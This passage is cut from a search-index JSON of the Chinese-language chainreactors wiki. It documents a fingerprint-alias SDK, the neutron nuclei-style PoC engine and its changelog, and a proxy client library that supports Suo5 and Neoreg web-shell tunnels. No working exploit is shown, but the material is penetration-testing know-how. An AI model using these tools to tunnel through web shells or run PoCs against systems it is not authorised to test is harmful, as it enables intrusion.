yonyou-ufida-nc\n</code></pre>"},{"location":"libs/fingers/sdk/#\u521d\u59cb\u5316_1","title":"\u521d\u59cb\u5316","text":"<p>Aliases\u521d\u59cb\u5316\u65f6\u5c06\u4f1a\u8fdb\u884c\u4e00\u4e9b\u6027\u80fd\u4f18\u5316\u7684\u4e0e\u529f\u80fd\u7279\u6027. </p> <p>\u6807\u51c6\u5316\u6240\u6709\u6307\u7eb9\u5e93\u7684Name, \u4f1a\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c</p> <ul> <li>\u4e2d\u6587\u8f6c\u62fc\u97f3</li> <li>\u5927\u5199\u8f6c\u5c0f\u5199</li> <li>\u5ffd\u7565<code>_</code>, <code>-</code>, <code>[blank]</code></li> </ul> <p>\u6dfb\u52a0\u6307\u7eb9Name\u7d22\u5f15, \u7528\u6765\u540e\u7eedFind\u65f6\u52a0\u901f\u7b49\u64cd\u4f5c.</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u672a\u7279\u522b\u914d\u7f6e\u5230aliases.yaml\u7684\u6307\u7eb9, \u5c06\u4ee5<code>fingers</code>\u7684\u539f\u751f\u6307\u7eb9\u5e93\u4f5c\u4e3a\u57fa\u51c6\u503c</p>"},{"location":"libs/fingers/sdk/#newaliases","title":"NewAliases","text":"<p>alias\u63d0\u4f9b\u4e86NewAliases, \u5c06\u4f1a\u4f7f\u7528<code>resources.AliasesData</code>\u7684\u6570\u636e\u53cd\u5e8f\u5217\u5316\u4e3a<code>[]*Alias</code> </p> <pre><code>func NewAliases(origin ...*Alias) (*Aliases, error) {\n    var aliases []*Alias\n    err := yaml.Unmarshal(resources.AliasesData, &amp;aliases)\n    if err != nil {\n        return nil, err\n    }\n    aliasMap := &amp;Aliases{\n        Aliases: make(map[string]*Alias, len(aliases)+len(origin)),\n        Map:     make(map[string]map[string]string),\n    }\n\n    err = aliasMap.Compile(append(origin, aliases...)) // yaml\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8eorigin\n    if err != nil {\n        return nil, err\n    }\n    return aliasMap, nil\n}\n</code></pre> <p>\u5176\u4e2dorigin\u7528\u6765\u63d0\u4f9b\u539f\u5148\u5df2\u7ecf\u52a0\u8f7d\u7684alias\u914d\u7f6e. \u4f8b\u5982\u5728NewEngine\u4e2d, \u5c06\u4f1a\u5c06<code>fingers</code>\u4f5c\u4e3aalias\u7684\u57fa\u51c6\u503c. </p> <pre><code>    // \u5c06fingers\u6307\u7eb9\u5e93\u7684\u6570\u636e\u4f5c\u4e3a\u672a\u914d\u7f6ealias\u7684\u57fa\u51c6\u503c\n    var aliases []*alias.Alias\n    if impl := engine.Fingers(); impl != nil {\n        for _, finger := range impl.HTTPFingers {\n            aliases = append(aliases, &amp;alias.Alias{\n                Name:    finger.Name,\n                Vendor:  finger.Vendor,\n                Product: finger.Product,\n                AliasMap: map[string][]string{\n                    \"fingers\": []string{finger.Name},\n                },\n            })\n        }\n    }\n\n    var err error\n    engine.Aliases, err = alias.NewAliases(aliases...)\n    if err != nil {\n        return err\n    }\n</code></pre>"},{"location":"libs/fingers/sdk/#appendaliases","title":"AppendAliases","text":"<p>alias\u63d0\u4f9b\u4e86\u63a5\u53e3\u7528\u6765\u8ffd\u52a0\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u522b\u540d\u914d\u7f6e.  </p> <pre><code>func (as *Aliases) AppendAliases(other []*Alias) {\n    err := as.Compile(other)\n    if err != nil {\n        return\n    }\n}\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f, \u8ffd\u52a0\u7684Alias\u4e2d\u5982\u679c\u5b58\u5728\u540c\u540d, \u5c06\u4f1a\u8986\u76d6\u5df2\u6709\u7684\u914d\u7f6e. </p> <p>\u5185\u7f6e\u7684NewEngine\u7684\u987a\u5e8f\u4e3a. </p> <ol> <li>fingers\u751f\u6210\u7684\u522b\u540d</li> <li>aliases.yaml \u914d\u7f6e</li> <li>\u7528\u6237\u81ea\u5b9a\u4e49\u52a0\u8f7d\u7684\u914d\u7f6e</li> </ol> <p>\u8d8a\u65e9\u52a0\u8f7d\u7684\u914d\u7f6e\u4f1a\u88ab\u540e\u7eed\u7684\u52a0\u8f7d\u7684\u914d\u7f6e\u8986\u76d6, \u56e0\u6b64\u5982\u679c\u5b58\u5728\u540c\u540d, \u90a3\u4e48\u7528\u6237\u52a0\u8f7d\u7684\u914d\u7f6e\u662f\u6700\u9ad8\u7684\u4f18\u5148\u7ea7. </p>"},{"location":"libs/fingers/sdk/#find","title":"Find","text":""},{"location":"libs/fingers/sdk/#findframework","title":"FindFramework","text":"<p>\u901a\u8fc7\u83b7\u53d6\u5230\u7684Framework\u83b7\u5f97\u7edf\u4e00\u7684\u6307\u7eb9\u547d\u540d.</p> <pre><code>func (as *Aliases) FindFramework(frame *common.Framework) (*Alias, bool) \n</code></pre>"},{"location":"libs/fingers/sdk/#findany","title":"FindAny","text":"<p>\u901a\u8fc7name\u67e5\u627e\u662f\u5426\u5b58\u5728\u7edf\u4e00\u547d\u540d</p> <pre><code>func (as *Aliases) FindAny(name string) (string, *Alias, bool)\n</code></pre>"},{"location":"libs/fingers/sdk/#find_1","title":"Find","text":"<p><code>FindAny</code>\u4e0e<code>FindFramework</code>\u7684\u5e95\u5c42\u63a5\u53e3</p> <p>\u67e5\u627eAliases\u4e2d\u662f\u5426\u5df2\u7ecf\u914d\u7f6e\u4e86\u6307\u5b9a\u6307\u7eb9\u5e93\u4e2d\u7684\u522b\u540d</p> <pre><code>func (as *Aliases) Find(engine, name string) (*Alias, bool)\n</code></pre>"},{"location":"libs/fingers/sdk/#framework","title":"Framework","text":"<p>Engine\u7684\u5404\u79cdDetect\u6216\u8005Match\u7684\u8fd4\u56de\u7ed3\u679c\u8981\u4e48\u662f<code>Frameworks</code>\u8981\u4e48\u662f<code>Framework</code>.</p> <p><code>Framework</code>\u5c31\u662ffingers\u4e2d\u7684\u6307\u7eb9\u6807\u51c6\u8f93\u51fa\u683c\u5f0f. \u5b83\u63d0\u4f9b\u4e86\u5230CPE\u6807\u51c6\u7684\u8f6c\u6362. \u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7279\u6027. </p> <ul> <li>\u652f\u6301\u91cd\u70b9\u5173\u6ce8\u6307\u7eb9\u6807\u8bb0</li> <li>\u652f\u6301\u81ea\u5b9a\u4e49tag</li> <li>\u652f\u6301\u4fdd\u7559\u6307\u7eb9\u6765\u6e90</li> <li>\u652f\u6301\u5bfc\u51fa\u5230\u901a\u7528\u6307\u7eb9\u683c\u5f0f</li> </ul> <p>Framework\u5b9a\u4e49:</p> <pre><code>type Framework struct {\n    Name        string        `json:\"name\"`\n    From        From          `json:\"-\"` // \u6307\u7eb9\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u6765\u6e90, \u6307\u7eb9\u5408\u5e76\u65f6\u4f1a\u5c06\u591a\u4e2a\u6765\u6e90\u8bb0\u5f55\u5230froms\u4e2d\n    Froms       map[From]bool `json:\"froms,omitempty\"`\n    Tags        []string      `json:\"tags,omitempty\"`\n    IsFocus     bool          `json:\"is_focus,omitempty\"`\n    *Attributes `json:\"attributes,omitempty\"`\n}\n</code></pre> <p>Attributes\u5373NVD\u5b9a\u4e49\u7684WFN\u6240\u9700\u8981\u7684\u5c5e\u6027.  <pre><code>type Attributes struct {\n    Part      string `json:\"part\" yaml:\"part\"`\n    Vendor    string `json:\"vendor\" yaml:\"vendor\"`\n    Product   string `json:\"product\" yaml:\"product\"`\n    Version   string `json:\"version,omitempty\" yaml:\"version,omitempty\"`\n    Update    string `json:\"update,omitempty\" yaml:\"update,omitempty\"`\n    Edition   string `json:\"edition,omitempty\" yaml:\"edition,omitempty\"`\n    SWEdition string `json:\"sw_edition,omitempty\" yaml:\"sw_edition,omitempty\"`\n    TargetSW  string `json:\"target_sw,omitempty\" yaml:\"target_sw,omitempty\"`\n    TargetHW  string `json:\"target_hw,omitempty\" yaml:\"target_hw,omitempty\"`\n    Other     string `json:\"other,omitempty\" yaml:\"other,omitempty\"`\n    Language  string `json:\"language,omitempty\" yaml:\"language,omitempty\"`\n}\n</code></pre></p> <p>Framework\u7684\u5927\u90e8\u5206api\u90fd\u662f\u57fa\u7840\u64cd\u4f5c, \u8bf7\u76f4\u63a5\u53c2\u9605\u4ee3\u7801. </p>"},{"location":"libs/fingers/sdk/#\u8f93\u51fa","title":"\u8f93\u51fa","text":"<p>Framework\u7684String()\u64cd\u4f5c\u5c06\u4f1a\u8f93\u51fa\u4e00\u4e2a\u9884\u7f6e\u7684\u683c\u5f0f.  \u5c3d\u53ef\u80fd\u7b80\u5355\u7684\u5305\u542b\u6240\u6709\u4fe1\u606f\u7684\u8f93\u51fa, \u4f46\u6211\u4e5f\u8ba4\u4e3a\u5b83\u5e76\u4e0d\u662f\u975e\u5e38\u7f8e\u89c2.</p> <p><code>tomcat:8.5.81:(goby fingers fingerprinthub)</code></p> <p>\u5982\u679c\u6709\u9700\u8981, \u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a\u683c\u5f0f\u5316\u7684\u51fd\u6570</p>"},{"location":"libs/fingers/sdk/#from","title":"From","text":"<p>\u6307\u7eb9\u6765\u6e90\u4fdd\u7559</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\u6307\u7eb9\u6765\u6e90\u8fd9\u4e00\u90e8\u5206.  \u5b9a\u4e49\u4e86\u76ee\u524d\u5185\u7f6e\u7684\u5404\u79cd\u6765\u6e90\u7684\u53ef\u80fd\u6027.  \u7c7b\u578b\u4e3aint</p> <pre><code>type From int\n\nconst (\n    FrameFromDefault From = iota\n    FrameFromACTIVE\n    FrameFromICO\n    FrameFromNOTFOUND\n    FrameFromGUESS\n    FrameFromRedirect\n    FrameFromFingers\n    FrameFromFingerprintHub\n    FrameFromWappalyzer\n    FrameFromEhole\n    FrameFromGoby\n)\n</code></pre> <p>1-5\u662fgogo\u5185\u7f6e\u7684\u6307\u7eb9\u6765\u6e90, \u5305\u62ec\u4e86\u5f3a\u5236\u8d4b\u4e88, \u4e3b\u52a8\u8bc6\u522b, \u56fe\u6807, 404\u9875\u9762, \u731c\u6d4b, \u91cd\u5b9a\u5411. </p> <p>6-10\u662f\u7b2c\u4e09\u65b9\u6307\u7eb9\u5f15\u64ce\u7684\u6570\u636e.</p> <p>\u5efa\u8bae\u4f7f\u7528\u65f6\u901a\u8fc7\u679a\u4e3e\u503c\u53bb\u5b9a\u4e49. </p> <p>\u5982\u679c\u81ea\u5b9a\u4e49\u6307\u7eb9\u5e93\u60f3\u4fdd\u7559\u6765\u6e90, \u9700\u8981\u627e\u4e00\u4e2a\u81ea\u5df1\u559c\u6b22\u7684\u6570\u5b57, \u4f8b\u5982<code>666</code>, \u7136\u540e\u5c06\u5176\u6ce8\u518c\u5230<code>FrameFromMap</code>\u4e2d</p> <pre><code>var FrameFromMap = map[From]string{\n    FrameFromDefault:        \"default\",\n    FrameFromACTIVE:         \"active\",\n    FrameFromICO:            \"ico\",\n    FrameFromNOTFOUND:       \"404\",\n    FrameFromGUESS:          \"guess\",\n    FrameFromRedirect:       \"redirect\",\n    FrameFromFingers:        \"fingers\",\n    FrameFromFingerprintHub: \"fingerprinthub\",\n    FrameFromWappalyzer:     \"wappalyzer\",\n    FrameFromEhole:          \"ehole\",\n    FrameFromGoby:           \"goby\",\n}\n</code></pre> <p>\u81ea\u5b9a\u4e49\u6307\u7eb9\u5f15\u64ce\u7684\u4ee3\u7801\u4e2d\u6dfb\u52a0 <pre><code>var CustomSource = common.From(666)\nfunc init() {\n    common.FrameFromMap[CustomSource] = \"custom\"\n}\n</code></pre></p>"},{"location":"libs/fingers/sdk/#frameworks","title":"Frameworks","text":"<p>\u5c01\u88c5\u4e86\u4e00\u4e9b\u8f83\u4e3a\u901a\u7528\u7684\u64cd\u4f5c. </p> <pre><code>type Frameworks map[string]*Framework\n</code></pre> <p>\u8bf7\u67e5\u9605\u4ee3\u7801.</p>"},{"location":"libs/fingers/sdk/#morefingers","title":"MoreFingers","text":"<p>\u76ee\u524d\u4e0d\u63d0\u4f9b\u516c\u5f00\u8bbf\u95ee</p> <p>\u652f\u6301\u7684\u6307\u7eb9\u5e93</p> <ul> <li>tanggo</li> <li>cube</li> </ul>"},{"location":"libs/neutron/","title":"neutron \u00b7 index","text":""},{"location":"libs/neutron/#overview","title":"overview","text":"<p>repo: https://github.com/chainreactors/neutron</p> <p>neutron\u662f\u4e3a\u4e86\u5728\u9700\u8981\u5de5\u5177\u843d\u5730\u7684\u573a\u666f\u4e2d\u4f7f\u7528\u800c\u9b54\u6539\u7684\u8f7b\u91cf\u7248nuclei \u5f15\u64ce, \u5b9e\u73b0\u4e86nuclei\u5f15\u64ce\u4e2d\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd, \u5e76\u4e14\u51e0\u4e4e\u4e0d\u9700\u8981\u5f15\u5165\u989d\u5916\u7684\u7b2c\u4e09\u65b9\u5e93. \u80fd\u517c\u5bb9\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf(windows xp/ windows server 2003). \u6781\u5c0f\u4f53\u79ef, \u51e0\u4e4e\u4e0d\u4f1a\u8ba9\u4e8c\u8fdb\u5236\u4f53\u79ef\u589e\u957f.</p>"},{"location":"libs/neutron/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>nuclei \u5b98\u65b9\u7684poc\u7f16\u5199\u6559\u7a0b https://nuclei.projectdiscovery.io/templating-guide/</p> <p>gogo\u5e38\u7528\u4e8e\u7279\u6b8a\u73af\u5883\u4e0b, \u56e0\u6b64\u5220\u9664\u4e86\u8bb8\u591anuclei\u539f\u6709\u7684\u529f\u80fd, \u4f8b\u5982dsl, oast\u4ee5\u53ca\u9664\u4e86http\u4e0etcp\u534f\u8bae\u4e4b\u5916\u7684\u6f0f\u6d1e\u63a2\u6d4b.</p> <p>nuclei\u66f4\u65b0\u8f83\u5feb, \u4e00\u822c\u60c5\u51b5\u4e0bgogo\u4f1a\u843d\u540enuclei\u6700\u65b0\u7248\u51e0\u4e2a\u6708, \u6240\u4ee5\u5efa\u8bae\u53ea\u4f7f\u7528\u57fa\u672c\u7684\u89c4\u5219, \u7f16\u5199\u6700\u7b80\u7684poc, \u4fdd\u8bc1\u517c\u5bb9\u6027.</p> <p>\u660e\u786e\u5220\u9664\u5e76\u4e14\u540e\u7eed\u4e0d\u4f1a\u6dfb\u52a0\u7684\u529f\u80fd</p> <p>\u90e8\u5206\u529f\u80fd\u4f1a\u7b80\u5316\u540e\u91cd\u65b0\u52a0\u5165\u5230neutron\u4e2d</p> <ol> <li>oast\u4e0eOOB.</li> <li>workflow, \u901a\u8fc7chain\u7b80\u5355\u4ee3\u66ff</li> <li>pipeline</li> <li>Race conditions</li> </ol> <p>TODO</p> <ul> <li> cookie reuse</li> <li> http redirect</li> <li> variables  </li> <li> Helper Functions (\u5df2\u652f\u6301\u5b8c\u6574\u7684dsl\u5f15\u64ce)</li> <li> Requests Annotation</li> <li> Unsafe HTTP</li> </ul>"},{"location":"libs/neutron/#\u6848\u4f8b","title":"\u6848\u4f8b","text":""},{"location":"libs/neutron/#gogo\u4e2d\u4f7f\u7528","title":"gogo\u4e2d\u4f7f\u7528","text":"<p>\u8bf7\u89c1: https://chainreactors.github.io/wiki/gogo/extension/#poc</p>"},{"location":"libs/neutron/#zombie\u4e2d\u4f7f\u7528","title":"zombie\u4e2d\u4f7f\u7528","text":"<p>\u8bf7\u89c1: https://chainreactors.github.io/wiki/zombie/extension/</p>"},{"location":"libs/neutron/update/","title":"neutron \u00b7 \u66f4\u65b0\u65e5\u5fd7","text":""},{"location":"libs/neutron/update/#update-log","title":"update log","text":""},{"location":"libs/neutron/update/#202431-gogo-v2120-zombie-v111","title":"2024.3.1 (gogo v2.12.0 zombie v1.1.1)","text":"<ul> <li>\u9002\u914d\u65b0\u7684nuclei, \u5c06http\u76f8\u5173templates\u5b57\u6bb5<code>requests</code> \u66ff\u6362\u4e3a<code>http</code></li> <li>\u5728\u5404\u4e2a\u6a21\u5757\u4e2d\u652f\u6301dsl(\u5728\u4e0d\u5f71\u54cd\u517c\u5bb9\u6027\u4e0e\u4e8c\u8fdb\u5236\u4f53\u79ef\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0), \u5305\u62ecmatch\u3001extractor\u3001payload\u3001path\u3001header\u3001raw\u7b49\u4f4d\u7f6e\u5747\u5df2\u652f\u6301</li> <li>\u65b0\u589e\u65b0\u7684payloads\u4f20\u5165\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u7f16\u8bd1\u540e\u52a8\u6001\u4fee\u6539payloads</li> <li>\u4fee\u590d\u591a\u4e2abug\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\uff0c\u9519\u8bef\u8f93\u51fa\u7b49</li> <li>\u79fb\u9664chainreactors/utils\u4f9d\u8d56\uff0c \u73b0\u5728neutron\u7684\u4f9d\u8d56\u66f4\u52a0\u5c11\u4e86\uff0c\u6b22\u8fce\u79fb\u690d\u5230\u5176\u4ed6\u5de5\u5177\u4e2d\u4f7f\u7528</li> <li>\u5728info\u5b57\u6bb5\u4e0b\u65b0\u589ezombie\u5c5e\u6027, \u53ef\u4ee5\u4f7f\u7528neutron template\u5728zombie\u4e2d\u52a8\u6001\u6ce8\u518c\u63d2\u4ef6\u5b9e\u73b0\u7206\u7834\u529f\u80fd</li> </ul>"},{"location":"libs/neutron/update/#2024626","title":"2024.6.26","text":"<p>\u8fdb\u4e00\u6b65\u517c\u5bb9nuclei\u7684dsl</p> <ul> <li>\u652f\u6301variables\u529f\u80fd</li> <li>\u652f\u6301randstr\u53d8\u91cf\u4e0eduration\u53d8\u91cf</li> </ul>"},{"location":"libs/neutron/update/#2024716-gogo-v2132-zombie-v120","title":"2024.7.16 \uff08gogo v2.13.2, zombie v1.2.0\uff09","text":"<p>\u73b0\u5728nuclei\u7684\u7edd\u5927\u90e8\u5206poc\u90fd\u4e0d\u9700\u8981\u4fee\u6539\u5c31\u80fd\u5728neutron\u4e2d\u6b63\u5e38\u8fd0\u884c</p> <ul> <li> <p>\u4fee\u590d\u4e00\u4e2a\u91cd\u5927bug\uff0c \u8be5bug\u5bfc\u81f4\u6bcf\u4e2atemplate\u53ea\u80fd\u88ab\u4f7f\u7528\u4e00\u6b21\u3002\u89c1\uff1a https://github.com/chainreactors/neutron/issues/4</p> </li> <li> <p>\u5b9e\u73b0\u89e3\u6790annotation, \u4f7f\u5f97\u5b58\u5728annotation\u7684yaml\u4e5f\u4e0d\u4f1a\u62a5\u9519, \u5b9e\u73b0\u4e86timeout annotation</p> </li> <li> <p>\u66f4\u4f18\u96c5\u7684\u5b9e\u73b0randstr\u4e0erandnum</p> </li> <li> <p>\u652f\u6301DN\u76f8\u5173\u53d8\u91cf @XiaoliChan</p> </li> <li> <p>\u5b9e\u73b0yaml\u53cd\u5e8f\u5217\u5316\u4fdd\u7559map\u987a\u5e8f, \u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1tag json\u517c\u5bb9go1.11</p> </li> <li> <p>dsl\u65b0\u589e<code>generate_shiro_gadget</code> @XiaoliChan</p> </li> <li> <p>\u89e3\u51b3\u6f5c\u5728\u7684conn\u6cc4\u9732\u95ee\u9898 @XiaoliChan</p> </li> </ul>"},{"location":"libs/proxyclient/","title":"index","text":"<p>\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u4ee3\u7406\u5ba2\u6237\u7aef\u5e93\uff0c\u652f\u6301\u591a\u79cd\u4ee3\u7406\u534f\u8bae\u3002\u672c\u9879\u76ee\u91cd\u6784\u81ea github.com/RouterScript/ProxyClient\u3002  </p>"},{"location":"libs/proxyclient/#\u652f\u6301\u7684\u534f\u8bae","title":"\u652f\u6301\u7684\u534f\u8bae","text":"<ul> <li> Direct - \u76f4\u8fde\u6a21\u5f0f  </li> <li> Reject - \u62d2\u7edd\u8fde\u63a5  </li> <li> Blackhole - \u9ed1\u6d1e\u6a21\u5f0f  </li> <li> HTTP - HTTP \u4ee3\u7406  </li> <li> HTTPS - HTTPS \u4ee3\u7406  </li> <li> SOCKS5 - SOCKS5 \u4ee3\u7406  </li> <li> ShadowSocks - ShadowSocks \u4ee3\u7406  </li> <li> SSH Agent - SSH \u4ee3\u7406  </li> <li> Suo5 - Suo5 \u534f\u8bae  </li> <li> Neoreg - Neoreg \u534f\u8bae</li> </ul>"},{"location":"libs/proxyclient/#example","title":"Example","text":""},{"location":"libs/proxyclient/#curl","title":"Curl","text":"<p>\u6a21\u62df curl \u547d\u4ee4\uff0c\u901a\u8fc7\u4ee3\u7406\u8bbf\u95ee\u6307\u5b9a\u7684 URL\u3002  </p> <pre><code>go build ./example/curl  \ncurl &lt;proxy-url&gt; &lt;target-url&gt;  \n\n# \u793a\u4f8b  \n./curl http://127.0.0.1:8080 https://example.com  \n</code></pre>"},{"location":"libs/proxyclient/#nc","title":"NC","text":"<p>\u6a21\u62df nc \u547d\u4ee4\uff0c\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u6307\u5b9a\u7684\u4e3b\u673a\u548c\u7aef\u53e3\u3002  </p> <pre><code>go build ./example/nc  \n./nc &lt;proxy-url&gt; &lt;target-host&gt; &lt;target-port&gt;  \n\n# \u793a\u4f8b  \n./nc http://127.0.0.1:8080 example.com 80  \n</code></pre>"},{"location":"libs/proxyclient/#socks5","title":"SOCKS5","text":"<p>\u5728\u672c\u5730\u542f\u52a8\u4e00\u4e2a SOCKS5 \u670d\u52a1\u5668\uff0c\u5c06\u6240\u6709\u6d41\u91cf\u901a\u8fc7\u4e0a\u6e38\u4ee3\u7406\u8f6c\u53d1\u3002  </p> <pre><code>go build ./example/socks5  \n./socks5 &lt;proxy-url&gt; &lt;listen-addr&gt;  \n\n# \u793a\u4f8b  \n./socks5 http://127.0.0.1:8080 :1080  \n</code></pre>"},{"location":"libs/proxyclient/#\u534f\u8bae\u914d\u7f6e\u8bf4\u660e","title":"\u534f\u8bae\u914d\u7f6e\u8bf4\u660e","text":""},{"location":"libs/proxyclient/#httphttps","title":"HTTP/HTTPS","text":"<p>HTTP \u548c HTTPS \u4ee3\u7406\u652f\u6301\u57fa\u672c\u8ba4\u8bc1\u3002  </p> <pre><code>\u683c\u5f0f\uff1ahttp(s)://[username:password@]host:port  \n\u53c2\u6570\uff1a  \n- username: \u8ba4\u8bc1\u7528\u6237\u540d  \n- password: \u8ba4\u8bc1\u5bc6\u7801  \n- host: \u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740  \n- port: \u4ee3\u7406\u670d\u52a1\u5668\u7aef\u53e3  \n\n\u793a\u4f8b\uff1a  \nhttp://user:pass@127.0.0.1:8080  \nhttps://127.0.0.1:8443  \n</code></pre>"},{"location":"libs/proxyclient/#socks5_1","title":"SOCKS5","text":"<p>\u652f\u6301\u65e0\u8ba4\u8bc1\u548c\u7528\u6237\u540d\u5bc6\u7801\u8ba4\u8bc1\u4e24\u79cd\u65b9\u5f0f\u3002  </p> <pre><code>\u683c\u5f0f\uff1asocks5://[username:password@]host:port  \n\u53c2\u6570\uff1a  \n- username: \u8ba4\u8bc1\u7528\u6237\u540d\uff08\u53ef\u9009\uff09  \n- password: \u8ba4\u8bc1\u5bc6\u7801\uff08\u53ef\u9009\uff09  \n- host: \u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740  \n- port: \u4ee3\u7406\u670d\u52a1\u5668\u7aef\u53e3  \n\n\u793a\u4f8b\uff1a  \nsocks5://127.0.0.1:1080  \nsocks5://user:pass@127.0.0.1:1080  \n</code></pre>"},{"location":"libs/proxyclient/#shadowsocks","title":"ShadowSocks","text":"<p>\u652f\u6301\u591a\u79cd\u52a0\u5bc6\u65b9\u5f0f\u3002  </p> <pre><code>\u683c\u5f0f\uff1ass://method:password@host:port  \n\u53c2\u6570\uff1a  \n- method: \u52a0\u5bc6\u65b9\u5f0f\uff0c\u652f\u6301\uff1aaes-256-gcm, chacha20-ietf-poly1305\u7b49  \n- password: \u5bc6\u7801  \n- host: \u670d\u52a1\u5668\u5730\u5740  \n- port: \u670d\u52a1\u5668\u7aef\u53e3  \n\n\u793a\u4f8b\uff1a  \nss://aes-256-gcm:password@127.0.0.1:8388  \n</code></pre>"},{"location":"libs/proxyclient/#suo5","title":"Suo5","text":"<p>Suo5 \u534f\u8bae\u652f\u6301\u591a\u79cd\u53c2\u6570\u914d\u7f6e\u3002  </p> <pre><code>\u683c\u5f0f\uff1asuo5(s)://host:port/path?param1=value1&amp;param2=value2  \n\n\u793a\u4f8b\uff1a  \nsuo5://example.com:8080/suo5.jsp\nsuo5s://example.com:8443/suo5.jsp\n</code></pre>"},{"location":"libs/proxyclient/#neoreg","title":"Neoreg","text":"<p>Neoreg \u534f\u8bae\u652f\u6301\u4e30\u5bcc\u7684\u53c2\u6570\u914d\u7f6e\u3002  </p> <pre><code>\u683c\u5f0f\uff1aneoreg(s)://key@host:port/path?param1=value1&amp;param2=value2  \n\u53c2\u6570\uff1a  \n- key: \u8fde\u63a5\u5bc6\u94a5\uff08\u5fc5\u9700\uff09  \n- timeout: \u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5982\uff1a5s  \n- retry: \u6700\u5927\u91cd\u8bd5\u6b21\u6570\uff0c\u9ed8\u8ba410  \n- interval: \u8bfb\u5199\u95f4\u9694\uff0c\u5982\uff1a100ms  \n- buffer_size: \u8bfb\u53d6\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u9ed8\u8ba432KB  \n\n\u793a\u4f8b\uff1a  \nneoreg://password@example.com:8080/tunnel.jsp?timeout=10s  \nneoregs://password@example.com:8443/tunnel.jsp?interval=200ms&amp;retry=5  \n</code></pre>"},{"location":"libs/proxyclient/sdk/","title":"SDK","text":"<p>\u672c\u6587\u6863\u8be6\u7ec6\u8bf4\u660e\u4e86 ProxyClient \u5e93\u7684\u6240\u6709\u516c\u5f00\u63a5\u53e3\u53ca\u5176\u4f7f\u7528\u65b9\u6cd5\u3002  </p>"},{"location":"libs/proxyclient/sdk/#\u57fa\u7840\u63a5\u53e3","title":"\u57fa\u7840\u63a5\u53e3","text":""},{"location":"libs/proxyclient/sdk/#newclient","title":"NewClient","text":"<p>\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u4ee3\u7406\u5ba2\u6237\u7aef\u3002  </p> <pre><code>func NewClient(proxy *url.URL) (Dial, error)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>proxy: \u4ee3\u7406\u670d\u52a1\u5668\u7684 URL \u793a\u4f8b\uff1a  </li> </ul> <pre><code>proxy, _ := url.Parse(\"http://localhost:8080\")  \ndial, err := proxyclient.NewClient(proxy)  \nif err != nil {  \n    panic(err)\n}  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#newclientwithdial","title":"NewClientWithDial","text":"<p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u4e0a\u6e38\u8fde\u63a5\u5668\u521b\u5efa\u4ee3\u7406\u5ba2\u6237\u7aef\u3002  </p> <pre><code>func NewClientWithDial(proxy *url.URL, upstreamDial Dial) (Dial, error)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>proxy: \u4ee3\u7406\u670d\u52a1\u5668\u7684 URL- upstreamDial: \u4e0a\u6e38\u8fde\u63a5\u5668  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>proxy, _ := url.Parse(\"http://localhost:8080\")  \ncustomDial := func(ctx context.Context, network, address string) (net.Conn, error) {  \n    dialer := net.Dialer{Timeout: 5 * time.Second}    \n    return dialer.DialContext(ctx, network, address)\n}  \ndial, err := proxyclient.NewClientWithDial(proxy, customDial)  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#newclientchain","title":"NewClientChain","text":"<p>\u521b\u5efa\u4ee3\u7406\u94fe\u3002  </p> <pre><code>func NewClientChain(proxies []*url.URL) (Dial, error)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>proxies: \u4ee3\u7406\u670d\u52a1\u5668 URL \u5217\u8868  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>proxy1, _ := url.Parse(\"socks5://localhost:1080\")  \nproxy2, _ := url.Parse(\"http://localhost:8080\")  \ndial, err := proxyclient.NewClientChain([]*url.URL{proxy1, proxy2})  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#newclientchainwithdial","title":"NewClientChainWithDial","text":"<p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u4e0a\u6e38\u8fde\u63a5\u5668\u521b\u5efa\u4ee3\u7406\u94fe\u3002  </p> <pre><code>func NewClientChainWithDial(proxies []*url.URL, upstreamDial Dial) (Dial, error)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>proxies: \u4ee3\u7406\u670d\u52a1\u5668 URL \u5217\u8868  </li> <li>upstreamDial: \u4e0a\u6e38\u8fde\u63a5\u5668  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>proxy1, _ := url.Parse(\"socks5://localhost:1080\")  \nproxy2, _ := url.Parse(\"http://localhost:8080\")  \ncustomDial := func(ctx context.Context, network, address string) (net.Conn, error) {  \n    return net.Dial(network, address)\n}  \ndial, err := proxyclient.NewClientChainWithDial([]*url.URL{proxy1, proxy2}, customDial)  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#registerscheme","title":"RegisterScheme","text":"<p>\u6ce8\u518c\u65b0\u7684\u4ee3\u7406\u534f\u8bae\u3002  </p> <pre><code>func RegisterScheme(schemeName string, factory DialFactory)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>schemeName: 